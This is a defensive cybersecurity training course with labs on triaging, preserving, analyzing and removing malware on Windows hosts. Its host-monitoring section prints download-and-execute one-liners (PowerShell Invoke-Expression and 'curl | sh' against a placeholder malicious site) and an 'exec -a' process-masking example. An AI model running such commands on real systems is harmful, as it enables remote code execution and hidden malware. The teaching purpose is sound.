### CDAH-M21L1-Limit the Spread of Malicious Activity ###

Triage and Malware Analysis
An incident occurs. The adversary successfully infects the network and a host with malware. For cyber defenders, the next step is to navigate the aftermath through a triage process. The triage process involves identifying and confirming the cause of the incident and isolating hosts or devices infected by malware to prevent spreading. Malware analysis may occur during or after the triage process and may be conducted through a static or dynamic method.

﻿

Analysis Goals 
﻿

Malware analysis is the process of studying or examining a suspicious file or program to determine its functionality. Malware analysis attempts to answer the six primary questions displayed in Figure 21.1-1, below.

Analysis Methods


Different methods are necessary to analyze the different types of malware available. Static analysis is suitable for situations where a dynamic analysis may not be feasible. Defenders also have the option to combine these two methods for a more robust analysis.


Static Analysis 


Static analysis of malware is the primary method used when the suspected malware cannot be safely executed in the environment. Static analysis involves examining a file or program to discover malicious content. Static analysis does not run the malware's code during the analysis. This type of analysis identifies Indicators of Compromise (IOC) and Tactics, Techniques, and Procedures (TTP) such as file names, Internet Protocol (IP) addresses, and domains.


Dynamic Analysis 


Dynamic analysis uses a closed environment, or sandbox, to run the malicious file or program. Dynamic analysis involves examining a file or program through execution to discover malicious content. 


Combined Analysis


It is also possible to combine the static and dynamic methods during malware analysis. Defenders combine methods by conducting the analysis in a sandbox environment. The analysis employs static analysis to search for and confirm IOCs while using dynamic analysis to execute a file or program.


Figure 21.1-2, below, highlights the key features of each type of analysis.

---------------

Initial Examination
An initial examination initiates the malware analysis and triage process. The primary goal at this stage is to limit the spread of malware as quickly as possible. Rather than conducting a deep investigation into the incident, defenders focus on learning only what is necessary to carry out immediate action. During this examination, defenders attempt to validate an infection by collecting and analyzing known malicious activity. Any IOCs and known information is used to investigate hosts and confirm the malicious activity.  

﻿

Execute an Initial Examination 
﻿

Read the scenario below, then complete the lab steps in the Virtual Machine (VM) ls-wkstn-3. Find the answers to the upcoming series of questions to complete an initial examination of an infected host. 

﻿

Scenario 
﻿

Security analysts identified a malware infecting hosts within the organization. The Cyber Protection Team (CPT) is investigating a host, which they suspect was the target of the infection. The malware varies in name, but is frequently seen using hidden folders and the registry to maintain persistence. Table 21.1-1, below, presents the specific TTPs associated with the malware:

﻿
![image](https://github.com/user-attachments/assets/ac9de2e7-09f6-4666-aa01-5028acf4729f)




Using the information above, access and conduct an initial examination to provide an overview of malware on the host ls-wkstn-3. Use static analysis for any malware detected on the host. Any additional execution of the malware may spread and worsen the infection. 


Workflow


1. Log in to the VM ls-wkstn-3 using the following credentials:
Username: trainee
Password: CyberTraining1! 



2. Search for hidden files in each user's Documents folder by navigating to the following path:
C:\Users

------------------

Malware on the Host
The host ls-wkstn-3 is infected with the malware ShadySocket, which was hidden in the directory C:\Users\Public\Public Documents. The functionality and purpose of the malware is unclear. Often, hidden files are an easy tactic adversaries employ to avoid detection and keep the malware on the target host. Adversaries also attempt to maintain persistence on the host with additional TTPs. For example, the registry may be used to execute a program at host startup to ensure the program is running whenever the host is powered on. 

﻿

Explore Additional TTPs During an Initial Examination
﻿

Proceed with the examination by investigating the registry of host ls-wkstn-3.

﻿

Workflow
﻿

1. Search for suspicious entries pointing to the directory C:\Users\Public\Public Documents and the file ShadySocket.exe. 

﻿

2. Answer the next set of questions to continue the initial examination.

-------------------------



Persistence on the Host
﻿

The registry for ls-wkstn-3 has a value for the malware ShadySocket located on the path HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. The malware has a registry item named SecurityForMe, which points to the path of the file ShadySocket.exe. The registry item attempts to start the malware upon host startup to maintain persistence. 


﻿------------------------

 
Initial Examination Summary
﻿

The CPT discovered and provided an overview of the malware ShadySocket by conducting an initial examination on host ls-wkstn-3. ShadySocket infected the host and is hidden in the folder C:\Users\Public\Documents. Additionally, the malware created a new registry entry aimed at persistence. The registry entry directed the host to start ShadySocket.exe at startup.

﻿

This concludes the initial examination of malware on the host ls-wkstn-3.

-----------------


Mitigation
Mitigation strategies to limit the spread of malware vary based on the organization's environment, the size of the infection, and the functionality of the malware. Common approaches to mitigation involve removing host connectivity and powering down the host. These mitigation strategies only occur after all required evidence is gathered, this includes the collection of images of the host's hard drive and volatile memory.

﻿

Removing Host Connectivity
﻿

When host defenders discover malware, their first priority is to remove all communications between the infected host and the network. This prevents the malware from doing the following:

Communicating with other hosts or devices in the network.
Communicating with an adversary's external network or environment.
Spreading the infection.
Defenders can easily remove connectivity by either physically unplugging network cables from the host or by accessing the Command Line Interface (CLI) of the host and disabling network interfaces. Removing host connectivity allows defenders to continue the investigation and analysis processes. However, disabling networking interfaces is only feasible when accessing the infected host directly on the console. If the defender is accessing the host remotely, shutting down network interfaces will sever the defender's access to the system.

﻿

Powering Down Host
﻿

Powering down a host after discovering it has malware is an effective precaution when little to no information is known about the malware on the host. Defenders power down the hosts to achieve the following:

Ensure the malware is inactive.
Gain time to plan an approach for mitigation and investigation.
Mitigate any existing malware damage to the host.
Despite its advantages, powering down an infected system also prevents defenders from collecting volatile memory data that may be helpful for an investigation. Additionally, powering down the host often does not remove or permanently deactivate the malware. When the host is powered on again, the malware may continue functioning and carrying out the adversary's campaign. Powering down the host also delays ongoing dynamic investigation of malware on that system until the host can be imaged or safely powered on again, in a controlled manner.


-----------


Limit Malware Spread
Continue working in ls-wkstn-3, which is infected with the malware ShadySocket. Limit the spread of the malware by using the host's CLI to list and shutdown network interfaces. Confirm the host no longer has connectivity with any network. 

﻿

Workflow
﻿

1. Log in to the VM ls-wkstn-3 using the following credentials:

Username: trainee
Password: CyberTraining1! 
﻿

2. Right-click Windows Start on the toolbar and select Command Prompt (Admin).

﻿

3. Select Yes in the dialog box that displays the prompt Do you want to allow this app to make changes to your device? 

﻿

4. View network interfaces on the host by entering the following command:

netsh interface show interface        
﻿

The Microsoft CLI utility netsh allows users to display or modify host network configurations. The command netsh interface show interface returns the network interfaces and their statuses on the host. 

﻿

5. Disable the interface Ethernet1 by entering the following command:

netsh interface set interface Ethernet1 disable
﻿

6. Disable the interface Ethernet0 by entering the following command:

netsh interface set interface Ethernet0 disable
﻿

7. Answer the next question to confirm steps 5 and 6 have been completed successfully.

![image](https://github.com/user-attachments/assets/4cd281f6-ad9c-4551-9b01-b0a220a290fe)


------------------


Successful Prevention and Migration
Listing the network interfaces after completing the previous lab outputs the following:


Admin State    State          Type             Interface Name
-------------------------------------------------------------
Disabled       Disconnected   Dedicated        Ethernet1
Disabled       Disconnected   Dedicated        Ethernet0
﻿

The output confirms the interfaces have been disabled successfully. The Admin State for both interfaces Ethernet1 and Ethernet0 are listed as Disabled. The State for both interfaces is listed as Disconnected. This indicates that all connectivity on the host has been removed, which prevents the malware from spreading.

-------------------


### CDAH-M21L2-Preserve Malicious Artifacts ### 

Preserving Malware Artifacts
Malware has been discovered on a host within the network. The triage process has successfully contained the spread and ensured that all critical information and hosts are not compromised. The next step in the triage process is preservation. Malware preservation begins with identification of the malware itself and artifacts related to it. Malware artifacts include items located in files, directories, scripts, browser history items, scheduled tasks, and even the malicious software. Given their broad and inclusive nature, malware artifacts can be located anywhere on the host, requiring a keen eye and investigative mindset to accurately identify. Preservation may include more investigation, as the initial goal of triage is solely to stop the spread and mitigate damage, meaning more artifacts may persist on the host. 


---------------------


Discover Malware Artifacts
In the following lab, use the provided scenario to analyze an infected host and discover malware artifacts. 

﻿

Scenario 
﻿

A Cyber Protection Team (CPT) has been tasked with investigating hosts that have been infected by the ShadySockets malware. Triage of the ls-wkstn-3 host uncovered the following Indicators of Compromise (IOC):


![image](https://github.com/user-attachments/assets/4d5fdb09-82fc-4512-82e3-7f265d885750)


The triage process was completed quickly to stop the spread of the malware and mitigate damage to the host. Because the work was so rapidly done, more artifacts as a result of ShadySockets may persist on the host. 


Using the information above, access and analyze the infected ls-wkstn-3 host to discover malware artifacts.


Workflow


1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:

Username: trainee
Password: CyberTraining1! 



2. Review hidden files located in C:\Users\Public\Documents to confirm that the ShadySockets.exe malware exists on the host. Once the existence of the malicious executable is confirmed, review and analyze the rest of the C:\Users\Public directory.   


Use this workflow to answer the following questions.


![image](https://github.com/user-attachments/assets/dec3a31a-c30d-4f45-8ee3-f8e75990fe10)


![image](https://github.com/user-attachments/assets/f13f419d-db62-4d4e-983b-6b55e6de9719)


![image](https://github.com/user-attachments/assets/2a60d938-e56a-41c9-bd31-eebd1b2779aa)


----------------------

Context for Discovered Artifacts
Figure 21.2-1 shows the hidden and nonhidden files in the C:\Users\Public\Downloads directory:


![image](https://github.com/user-attachments/assets/d6f88a2d-0433-4ab7-86a8-cda6a1805fdf)


NOTE: By default, the file path shown in the address bar is the display name of the directory rather than its underlying directory path.


The nonhidden file, document.pdf, can potentially point to the initial cause of the infection. In this scenario, the document.pdf file is a malicious document. The user downloaded the document.pdf file from what they thought was a trusted source, and when the file was opened, it initiated malicious downloads and modifications to the host. The downloads and modifications are programmed to occur in the background, hidden and unknown to the user. 


Of the downloaded hidden files, Nmap and nmap-7.92-setup are aimed at conducting active reconnaissance on the network. The adversary may strategically place these on the victim host in an effort to identify other hosts and devices on the network and expand use of the malware and the campaign. The Enable-RDP file is a Windows PowerShell script, likely to enable Remote Desktop Protocol (RDP) on victim hosts that the adversary has infected with the malware. 


-------------------

Investigate Task Scheduler
Often, such scripts as Enable-RDP that are planted on the victim host are leveraged to enable settings or access critical information that provide functionality and payload to the adversary. Scripts automate otherwise tedious tasks and processes and can be scheduled to run outside the view of the user. For this reason, Task Scheduler must be investigated.

﻿

In Windows, Task Scheduler allows users to automatically perform routine tasks on a chosen computer. Task Scheduler monitors user-defined triggers, and when a trigger is activated, the user-defined tasks, or actions, are then completed on the host. Task Scheduler allows the actions to occur hidden, away from view of the user, making it an attractive application for the adversary to leverage.

﻿

Complete the steps in the following workflow to investigate Task Scheduler.

﻿

Workflow
﻿

1. Right-click the Windows icon located on the taskbar, select Control Panel, select Administrative Tools, and select Task Scheduler.

﻿

2. In the left pane of Task Scheduler, under Task Scheduler (Local), select Task Scheduler Library.

﻿

3. In the Task Scheduler Library, review the scheduler tasks, and look for actions that call for execution of the Enable-RDP script. 

﻿

Use this workflow to answer the following questions.

![image](https://github.com/user-attachments/assets/bfbbd66b-9526-4520-8be4-d3ba5625973d)


-----------------

Artifacts Discovered
Through investigation and analysis of files and directories on the ls-wkstn-3 host, the CPT discovered and provided artifacts related to the ShadySockets malware. ShadySockets has infected the host, and related artifacts were found in the C:\Users\Public\Downloads folder. The artifacts included an application installation of the Nmap software, an exfiltration folder, a suspicious Portable Document Format (PDF) file, and a Windows PowerShell script. Additionally, the malware created a scheduled task, RDP, to ensure RDP was enabled on the host. These artifacts continue in the preservation process and require further analysis later in the investigation. 


-------------


Handling Malware Artifacts
Evidence is key to a criminal investigation, providing critical answers to the questions Who? What? When? Where? Why? and How? Cybersecurity evidence is no different from criminal evidence in this regard. Cybersecurity evidence holds vital information that must be preserved. Changes may alter the behavior of the malware, artifacts, or evidence that already exists on the host, compromising portions of the investigation. To handle malware evidence appropriately, Cyber Defense Analysts (CDA) must minimize making changes to the victim host. Although some changes are necessary to mitigate damage, such as removing network connectivity, limiting the amount of changes to the bare minimum is a priority.  

﻿

Evidence Integrity
﻿

Evidence integrity is the protection of evidence material from alteration, contamination, or deletion. Malware evidence can be easily tampered with or modified, and maintaining the integrity of the evidence is a critical task. Techniques and tools used must be aimed at accurately and efficiently collecting and storing evidence. 

﻿

One technique often used in a cybersecurity investigation is the collection of a forensic image. A forensic image is a direct copy of the host’s physical storage device, such as the Hard Disk Drive (HDD). A forensic image contains all files, directories, and space allocations (illustrated in Figure 21.2-2). In an ideal scenario, all investigative actions would occur on the forensic image rather than on the directory on the victim host. Using a forensic image achieves the goal of handling a malware-infected host, as CDAs are not changing or making direct contact with the host.


![image](https://github.com/user-attachments/assets/4213b04c-da2f-4306-90ba-1492a1fa66db)


Sometimes an investigation may require CDAs to complete tasks and actions directly on the victim host. Should work directly on the host be required, documentation of all activities through the use of Operation Notes (OPNOTES) is top priority. After completing significant tasks such as memory capture, endpoint analysis, or malware remediation, Forensic images should be created frequently, after such major tasks or actions as memory capture, malware remediation, or endpoint analysis are completed.


![image](https://github.com/user-attachments/assets/cb864b49-1f4e-4ee1-bff0-686f182c854d)



-----------------



Extracting Malware Artifacts
Extracting malware artifacts includes copying artifacts from the host machine for further investigation. Accurately extracting malware relies on deliberate actions and documentation. Any actions taken must be recorded so that the investigation is not confused with the injection. Methods of extraction have two goals: to accurately extract malicious artifacts and to preserve the organization’s OPSEC, meaning the sensitive information is not compromised in any way.


---------------


Hash Malware Artifacts
A hash algorithm provides a unique, fixed-length string for a piece of data or file. Hashing refers to the application of the hash algorithm to a file or folder at a given point in time. The output of hashing a file or folder, an alphanumeric string referred to as a hash value, is unique to the file or folder. If a file or folder is hashed again in the future and the new hash value is different from the original hash value, changes have occurred in the file or folder. Hashing a file or folder is an effective method to extract malicious samples in a manner that preserves OPSEC. The hash algorithm relies on a complex equation to derive the hash’s value. Numerous algorithms exist, such as Message Direct 5 (MD5) and Secure Hash Algorithm (SHA). Each algorithm is different; however, the overall goal is the same: to produce a hash value that maintains the integrity and security of the artifact. 

﻿

Windows PowerShell is a common tool for quickly and effectively hashing a file, using the Get-FileHash cmdlet. Get-FileHash by default uses the SHA256 algorithm, but it can be changed and defined by the user.

﻿

The following lab involves hashing ShadySockets malware artifacts. The ShadySockets malware was found on host ls-wkstn-3. The CPT collected an image of the infected host.

﻿

Hash Malware Artifacts | Part 1
﻿

Complete the steps in the following workflow to access the copy of the ls-wkstn-3 host infected with the ShadySockets malware and hash previously identified malware artifacts. 

﻿

Workflow
﻿

1. Log in to the VM ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Access a new Windows PowerShell terminal.

﻿

3. Within the terminal, navigate to C:\Users\Public\Downloads.

﻿

4. To view the nonhidden files contained in the C:\Users\Public\Downloads folder, run the following cmdlet:


ls
﻿

5. To view the hidden files contained in the C:\Users\Public\Downloads folder, run the following cmdlet:


ls -hidden
﻿

-hidden following the ls command ensures that all hidden files are displayed. 

﻿

6. Run the following cmdlet:


Get-FileHash .\document.pdf
﻿

Figure 21.2-3 displays the output returned from the cmdlet:

![image](https://github.com/user-attachments/assets/e0970d46-09bd-4ace-8841-578d26f886b8)

The hash is the result of the SHA256 algorithm for the document.pdf file. 


7. Run the following cmdlet:

Get-FileHash .\document.pdf -Algorithm MD5



Figure 21.2-4 displays the output returned from the cmdlet:

![image](https://github.com/user-attachments/assets/791c2603-818d-4353-aaad-b380189c74c1)



Using -Algorithm, users can define the hashing algorithm. Figure 21.2-4 shows the use of the MD5 hash for the document.pdf file.  


If the document.pdf file is manipulated or changed, the hash value is different from what is currently listed in Figure 21.2-3 and Figure 21.2-4. It is critical to hash all artifacts at the start of the investigative process and after any actions are taken on the host. The hash values must be recorded to preserve OPSEC and an accurate view of the investigative actions.

### CDAH-M21L3-Investigate Malicious Software ###

Malware Investigation
An organization has identified a threat or potential breach, and its incident response plan has been put into action. The top priority during the response is mitigation of the threat and prevention of any damage to the organization’s hosts and devices. An additional priority is preservation and investigation of the malware and the mechanisms used to conduct the breach. Static analysis and dynamic analysis of the malware are needed to aid in the investigation. Malware analysis provides critical information that an organization can use to assess and modify its current cybersecurity defense posture. 

﻿

Malware Analysis 
﻿

The goal of malware analysis is to research and identify malware and malware artifacts in an effort to evolve defenses and protect the organization’s network. Malware analysis must seek to answer the following questions:

What was the attack vector used for the infection? 
What is the malware’s interactive behavior, what does it do, and what does it change?
What are the static properties (such as hashes, metadata, and embedded strings) of the malware?

Malware analysis may not always provide answers to each of the questions listed; unknowns may persist. However, malware analysis should strive to answer each question using the data and information available. At the end of the analysis, IOCs and TTPs should be summarized and identified. 


------------------


Investigation
Read the following scenario: 

﻿

A Cyber Protection Team (CPT) is tasked with analyzing a malware file discovered on an infected host, ls-wkstn-3, as part of a wide-scale network breach. The malware has been identified as a potentially malicious PDF file, Financial Report Q2.pdf, located on the path C:\Users\trainee\Desktop\CorporateQ2. Additionally, security analysts have identified email as the attack vector used by the threat actor to introduce the malware to the organization’s network.

﻿

Security analysts conducted research on similar malicious documents found in the organization. Table 21.3-1 provides the TTPs and associated notes:

﻿
![image](https://github.com/user-attachments/assets/7a089eed-9a50-473f-ac17-24356ab127b7)

Using the information above as well as information provided in upcoming tasks, perform a hands-on investigation of the malware to determine the malware’s specific TTPs.


Investigation | Part 1


Complete the steps in the following workflow to perform both static and dynamic analyses on the ls-wkstn-3 host. The ls-wkstn-3 host is located in a sandbox environment.

----------------

Investigation | Part 2
The Financial Report Q2.pdf file presented additional malware artifacts to the ls-wkstn-3 host. One of the artifacts found on the host is updateCheck.exe, an executable file located on the path C:\Users\trainee\AppData\Roaming. 

﻿

The executable file’s functionality is not known.

﻿

Workflow
﻿
1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿
﻿

2. Execute the updateCheck.exe file, and analyze the actions that occur.


![image](https://github.com/user-attachments/assets/19e19d0c-7592-45d3-8599-616e398ce573)


-------------

Investigation | Part 3
The updateCheck.exe file causes a dialog box to appear on the ls-wkstn-3 host. The dialog box indicates that “cdah has stopped working.” The alert is not a usual occurrence. It is possible the malware is attempting to complete a task, connection, or action. However, the attempt is not successful.


![image](https://github.com/user-attachments/assets/f919db99-2106-4b8d-bef3-1e89773b89a7)


-----------------


Investigation | Part 4
The appearance of the “cdah has stopped working” dialog box as a result of opening the updateCheck.exe file may point to some of the malware’s functionality. It is possible that the malware attempts to connect to internal or external hosts in an attempt to either widen the infection or deliver exfiltrated data from the compromised environment. 

﻿

Persistence
﻿

To persist on the host, malware often targets the host’s registry with the creation of key items. The key items allow the malware to start itself or additional artifacts when the host powers on. Common registry locations targeted by adversaries include the following:


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

Workflow
﻿

1. Log in to the Virtual Machine (VM) ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿
﻿

2. Review the common registry paths for any items that point to updateCheck.exe.

ATT&CK TTPs
MITRE ATT&CK® is a knowledge base of common adversarial attack TTPs used against Windows networks. Currently, the ATT&CK matrix (attached) includes 14 tactics, which cover the why (the objective for performing the action), and more than 180 techniques (with nearly 400 subtechniques), which state how the adversary is going to perform the action and what they hope to gain from it.

﻿

MITRE’s model reflects the various phases of an adversary’s attack lifecycle and the platforms they are known to target but is free from the rigidity of a linear attack chain. At a high level, the ATT&CK matrix is a behavioral model that consists of the following core components: 

Tactics: Short-term, tactical adversary goals during an attack (the columns in the ATT&CK matrix). 
Techniques: The means by which adversaries achieve tactical goals (the individual cells in the ATT&CK matrix). 
Documented adversary use of techniques and other metadata (linked to techniques): ATT&CK is not an exhaustive enumeration of attack vectors against software, but the documented operation can be used to contextualize the impact of an attack, the actors known to employ the technique, and other information.
The ATT&CK matrix can help define and associate characteristics of malware identified within hosts. Using the ATT&CK matrix, Cyber Defense Analysts (CDA) can view techniques and subtechniques that aid in further research of the malware and point to other events that may occur.

Associate Malware with ATT&CK TTPs
During the initial investigation, the following items regarding malware were discovered: 


A malicious PDF file sent via email as an attachment, Financial Report Q2.pdf, located on the path C:\Users\trainee\Desktop\CorporateQ2.

A hidden executable file, updateCheck.exe, located on the path C:\Users\trainee\AppData\Roaming.

An attempt by updateCheck.exe to make connections; the connections fail.

An Abobe entry in the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry paths. 


Using the information in the attached ATT&CK matrix, review the malware items obtained during the initial investigation. Associate each item with ATT&CK TTPs found in the matrix.

### CDAH-M21L4-Neutralize Malicious Software ###

Neutralizing and Removing Malware
Modern malware is sophisticated in its functionality and ability to evade initial detection as it traverses the entry control points of a network and endpoint anti-malware systems. Organizations often configure anti-malware systems to stop scanning analysis after a file has crossed the control point and is successfully in the environment. Organizations commonly do not employ constant monitoring of files and applications already accepted in the environment in favor of system performance and resource allocation. 

﻿

Once a breach has been detected, the incident response process starts. After the malware has been contained and triaged, the neutralize (clean) phase begins. The neutralize phase relies on analysts’ neutralizing threats without corrupting forensic artifacts. Tasks during this phase may include terminating malware processes, reinstalling Operating Systems (OS), or verifying malware removal, as illustrated in Figure 21.4-1. Malware complexity and organizational impact are factors that impact the decisions and strategies analysts take in this stage. 

﻿![image](https://github.com/user-attachments/assets/5de8358c-1af1-4e02-a543-6f15574a8a05)

Factors Affecting the Path for Malware Removal


Advanced malware attacks evade detection using complex techniques, such as sleep functionality, encryption, and polymorphic code, and these techniques change their identifiable features constantly. Additionally, malware can infect a system’s Unified Extensible Firmware Interface (UEFI). As a result, the malware is capable of surviving a system reboot, OS reinstallation, and a hard disk replacement. Advanced malware features can make the removal method unreliable in certain scenarios. The decision to remove malware is heavily dependent on the results from dynamic analysis in the investigative phase. 


Ideally, a system or host would be restored to an image in a known good state. Once the system or host is restored, hardening tasks would be applied to patch vulnerabilities and prevent a similar attack from occurring. Organizations must factor in the complexity of the system or hosts when deciding how to handle a malware infection. Rebuilding complex systems requires a large amount of resources, including access to the system, time, personnel, and money. In addition, the collateral damage from extended downtime to the Information Technology (IT) system and organization can be a catastrophic loss leading to mission failure.

Remove Malware
Scenario: Investigative Report
﻿

A Cyber Protection Team (CPT) investigation was previously completed, identifying suspicious internet traffic on ls-wkstn-3. ls-wkstn-3 is a host used by a financial purchasing agent that contains large amounts of financial account information and Personally Identifiable Information (PII). Hypertext Transfer Protocol Secure (HTTPS) traffic bound for geocities.com and yahoo.com was redirected to Internet Protocol (IP) address 210.210.210.2. This IP address is known to be part of the infrastructure used by the amateur threat actor group FranklinEdition. During the investigation, the CPT analysts reviewed Security Information and Event Management (SIEM) traffic and conducted host analysis. As a result, numerous pieces of information; artifacts; and Tactics, Techniques, and Procedures (TTP) were discovered, as shown in Table 21.4-1. Table 21.4-1 also contains each discovered TTP’s link to its associated technique in the MITRE ATT&CK® matrix.

---------------------

Mitigate Threats
The detailed forensic investigation identified three primary security issues that led to the successful exploitation via the malicious PDF file. Table 21.4-2 describes the security issues. The Information Assurance (IA) office has also provided updated software to resolve, harden, and mitigate the exploitable security issues. Previous analysts have placed the software in the IA Software folder on the path C:\Users\trainee\Desktop.

﻿![image](https://github.com/user-attachments/assets/f68d09aa-9788-46c6-b984-8e42612dd214)

A threat mitigation operation has been ordered. While implementing threat mitigations are not typically done by a CPT, the client has requested the CPT aid in threat mitigation that preserves the environment. This involves accessing ls-wkstn-3 and addressing each of the security issues in Table 21.4-2. 




Mitigate Threats: Update Adobe Reader and Windows 10


Complete the steps in the following workflow to update Adobe Reader and Windows 10.

Username: trainee
Password: CyberTraining1! 



2. Access the IA Software folder on the path C:\Users\trainee\Desktop.


3. Select AcroRdrDC2200220191_en_US. Select Yes when prompted with Do you want to allow this app to make changes to your device?


The Adobe Acrobat Reader DC - Setup dialog box appears.


4. Select Continue, and select Install when prompted. 


Adobe executes its installation process. Once complete, the dialog box indicates that the installation was successful.


The new version of Adobe is now used when accessing PDF files. The update provides critical patches that prevent the adversary from using the malicious PDF file technique against the host. 


5. Access the IA Software folder on the path C:\Users\trainee\Desktop.


6. Select Windows10.0-KB4023057-x64. Select Run when prompted Do you want to run this file?


Allow 1 to 2 minutes for the installation to complete. When the dialog box disappears, the installation is complete. 


-----------------


Mitigate Threats: Enable Windows Defender
Complete the steps in the following workflow to continue threat mitigation operations by accessing the registry and enabling Windows Defender.

﻿

Workflow
﻿

1. On the taskbar, right-click Windows, select Run, enter regedit, and select Enter. This opens Registry Editor. 

﻿

2. In Registry Editor, navigate to the path HKLM\SOFTWARE\Policies\Microsoft\Windows Defender.

﻿

3. Right-click DisableAntiSpyware, and select Delete. 

﻿

By selecting Delete, the entry to disable Windows Defender (DisableAntiSpyware) is removed from the registry. Removing the entry enables Windows Defender to run on the host. Windows Defender provides anti-malware and security protocols to protect the host.

﻿

4. On the taskbar, select Windows. In the Windows System folder, select Windows Defender. 

﻿

5. Within Windows Defender, select Start Now.    

﻿

Figure 21.4-1 shows Windows Defender successfully active and running on the host:

﻿![image](https://github.com/user-attachments/assets/5812c1af-cbec-47fc-832a-f3f420954ea1)


----------------

Mitigate Threats: Enable Connectivity
Complete the steps in the following workflow to complete threat mitigation operations, bringing the host back into the operating environment by enabling network connectivity. 

﻿

Workflow
﻿

1. Open a new command prompt as an Administrator. 

﻿

2. Run the following command:


netsh interface set interface Ethernet0 enable
﻿

3. Run the following command to verify that the network connectivity has been restored:


netsh interface show interface
﻿

The following output is returned:﻿


Admin State    State          Type             Interface Name
-------------------------------------------------------------

Enabled        Connected      Dedicated        Ethernet0
﻿


The output verifies that the host has been successfully returned to the environment — the final step in the threat mitigation operation. The host is free from malware and now includes updates to heavily used software as well as an active anti-malware program. The host can resume operations within the environment.

### CDAH-M22L1-Monitoring Malware Techniques on Host ###


Host-Based Malware Execution Techniques
Browser-Based Malware
﻿

Web browsers provide a rich target environment for malware developers, and both desktop and mobile browser platforms are affected. A common browser-based malware technique is the use of JavaScript (JS) as a stored Cross-Site Scripting (XSS) injected element. Upon visiting an infected website, a user is redirected to a site controlled by the attacker. In some cases, this results in the user’s downloading of unintended software, known as a drive-by download, or the attacker’s harvesting user credentials from a fake login form.

﻿

Social engineering, in general, is a means by which an attacker attempts to gain the trust of a target. Attackers who use social engineering to target web- or browser-based environments produce information such as websites or emails to coerce a user into selecting a malicious link or downloading an attachment containing malware.

﻿

Fileless Malware
﻿

Many people assume that malware requires an executable file located physically on the computer. This is a false assumption. If an attacker can gain remote access to a machine (such as through stolen credentials or a browser exploit), they can use file system utilities to download and execute follow-on malicious software without those files ever touching the disk. For example, the following PowerShell command downloads the malware.ps1 script and executes it using the Invoke-Expression command within the current PowerShell memory space:

Powershell.exe -ExecutionPolicy Bypass -NoProfile -NoExit -Command Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://<Malicious Site>/malware.ps1'))
﻿

An attacker targeting a Linux platform can use a combination of Curl (or Wget) and the command pipe to achieve the same effect:

curl -k https://<Malicious Site>/malware | sh
﻿

Due to the repeated use of specific switches and options, using system commands to execute fileless malware results in Indicators of Compromise (IOC) for which a signature can easily be written. 

﻿

Linux exec Process Replacement
﻿

A Linux process list displays the processes currently running on the system. Normally, the name displayed is the same as the executable name. An attacker can take advantage of the -a switch of the exec command to mask their malware process name. The following example illustrates this concept.

﻿

Using the template below, an attacker creates a file called socket. Its purpose is to open a port and listen for connections, printing out a message upon success.


import socket
import sys

HOST = ""
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.bind((HOST, PORT))

except socket.error as msg:
print(f"Bind failed. Error Code : {msg[0]} - {msg[1]}")
sys.exit()
	
print("Socket bind complete")
s.listen(10)

conn, addr = s.accept()

print(f"Connected with: {addr[0]}, {addr[1]}")
﻿


When the program is executed, the process list looks like Figure 22.1-1, showing obvious malware:

﻿
<img width="600" height="83" alt="image" src="https://github.com/user-attachments/assets/5ac309d1-a083-43ad-9057-80b035809a8a" />


The attacker then chooses an appropriate process name for the system. Because this is a Virtual Machine (VM), the process name /usr/bin/vmtoolsd is selected and the socket template is renamed to vmusr to match similar processes. The process is executed with the following command:
exec -a "/usr/bin/vmtoolsd" python3 vmusr



Figure 22.1-2 shows the process list with hidden malware:

<img width="679" height="101" alt="image" src="https://github.com/user-attachments/assets/8174be62-7068-4eb4-bf9a-a2adbde1a87c" />


The new process disguises the Python 3 binary with the name /usr/bin/vmtoolsd. This method has its own issues. A careful examination of the netstat shows a listening port assigned to the masked process:

<img width="594" height="18" alt="image" src="https://github.com/user-attachments/assets/b923996e-746b-4850-82c9-61c979925b8d" />


Other Methods of Execution


More traditional forms of malware, such as Trojan horse applications, execute much like normal applications, but they have additional features that may be hidden from the user. One such feature is Dynamic Link Libraries (DLL) hijacking, which is the ability to hijack a system library by replacing it with a modified version of that library. The modification may allow an attacker to access a back door or bypass authentication completely.

-----------------

Analyze Malware Execution on Windows
A Cyber Protection Team (CPT) has been assigned to analyze a machine that an organization believes has been infected with malware. In this lab, which consists of three workflows, analyze how the malware executes, how the malware persists, and how the malware propagates.

﻿

Complete the steps in the following workflow to analyze the malware execution.

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Launch the Procmon64.exe application from within the Process Monitor folder located on the desktop.

﻿

NOTE: The dialog box shown in Figure 22.1-4 appears if previous filters are present. Select OK if the dialog box appears.


<img width="592" height="364" alt="image" src="https://github.com/user-attachments/assets/e38d9357-e7e9-42fe-b032-ebdb6b6a2dad" />


3. Select Process Tree via the Tools menu option at the top of the window. Alternatively, enter Ctrl+T to open the same dialog box.


4. Inspect the process list for suspicious entries. Pay attention to parent–child relationships between processes, and determine if a relationship indicates a potentially malicious process.


The process list should appear similar to Figure 22.1-5:


<img width="674" height="50" alt="image" src="https://github.com/user-attachments/assets/eae05bbf-dbc8-4c1e-b4ff-1c28bb1da1c0" />


The figure shows that python.exe is a child of svchost.exe, which is not typically how python.exe is executed. (python.exe typically runs as a child of explorer.exe.) This may be the source of the malware.


5. Scroll across the columns until the Command column appears. The Python application above has the following command-line arguments:
C:\users\trainee\AppData\Local\Programs\Python\Python310\python.exe C:\Users\Trainee\AppData\Local\listen.py



6. Navigate to the location from which the Python script is being executed, and note the existence of the listen.py file.


